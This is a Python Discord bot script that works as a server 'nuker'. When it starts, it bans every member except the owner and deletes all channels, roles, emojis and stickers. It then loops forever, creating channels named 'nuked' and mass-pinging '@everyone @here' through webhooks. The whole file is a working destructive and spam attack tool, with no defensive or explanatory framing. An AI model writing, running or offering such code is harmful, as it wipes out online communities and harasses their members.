import discord
from discord.ext import commands
from dotenv import load_dotenv
import os
import asyncio

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=',', intents=intents)

@bot.event
async def on_ready():
    print(f'Signed in as {bot.user.name}')
    guild = bot.guilds[0]

    members_to_ban = [m for m in guild.members if m != guild.owner]
    for chunk_start in range(0, len(members_to_ban), 100):
        chunk = members_to_ban[chunk_start:chunk_start + 100]
        try:
            await guild.ban(chunk, reason="gg")
        except Exception:
            for member in chunk:
                try:
                    await guild.ban(member, reason="gg")
                except:
                    pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    roles_to_delete = [r for r in guild.roles if r.name != "@everyone"]
    for role in roles_to_delete:
        try:
            await role.delete()
        except:
            pass

    emojis_to_delete = guild.emojis
    for emoji in emojis_to_delete:
        try:
            await emoji.delete()
        except:
            pass

    for sticker in guild.stickers:
        try:
            await sticker.delete()
        except:
            pass

    print("Nuke complete. Starting spam...")

    created_webhooks = []

    async def create_channels_and_webhooks(count=10):
        for i in range(count):
            try:
                channel = await guild.create_text_channel(f"nuked")
                webhook = await channel.create_webhook(name=".")
                created_webhooks.append(webhook)
            except Exception as e:
                print(f"Error creating channel/webhook: {e}")

    async def channel_creator_loop():
        while True:
            await create_channels_and_webhooks(500)
    async def webhook_spam_loop():
        while True:
            tasks = []
            for webhook in created_webhooks:
                try:
                    tasks.append(webhook.send(content="@everyone @here", wait=True))
                except Exception as e:
                    print(f"Error sending webhook message: {e}")
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(5)

    await asyncio.gather(channel_creator_loop(), webhook_spam_loop())

bot.run(TOKEN)